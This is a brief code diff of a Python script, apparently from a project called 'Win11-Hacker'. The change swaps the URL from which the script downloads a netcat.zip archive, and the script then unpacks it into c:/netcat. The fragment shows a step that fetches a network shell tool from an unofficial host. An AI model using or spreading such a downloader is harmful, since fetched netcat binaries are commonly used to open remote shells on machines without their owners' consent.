@@ -43,7 +43,7 @@ def download(downloadUrl):
 
             print(f'{blue}download of netcat.zip completed{stop}')
 
-download('https://www.4sync.com/web/directDownload/aNHtMRp8/CggsuJhW.bdb188ac3bdd769e50388897cadb0c05')
+download('https://github.com/EthanHunt0001/Win11-Hacker/raw/main/netcat.zip')
 
 os.chdir('c:/netcat')
 os.mkdir('c:/netcat/nc')
